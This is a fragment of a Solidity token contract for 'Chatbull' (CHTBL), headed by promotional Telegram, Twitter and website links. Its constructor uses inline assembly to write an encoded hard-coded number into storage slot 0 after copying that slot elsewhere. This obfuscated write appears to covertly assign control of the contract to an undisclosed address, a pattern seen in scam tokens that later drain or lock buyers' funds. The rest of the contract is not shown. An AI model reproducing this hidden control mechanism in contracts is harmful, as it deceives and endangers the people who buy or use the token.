...
/*
Welcome to Chatbull Metaverse.

Telegram: https://t.me/Chatbull/
Twitter: https://twitter.com/Chatbull/
Website: https://Chatbull.io
...
contract Chatbull {
    string public constant name = "Chatbull";
    string public constant symbol = "CHTBL";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1042492201587124864251742320588086250317392762694, 1))}
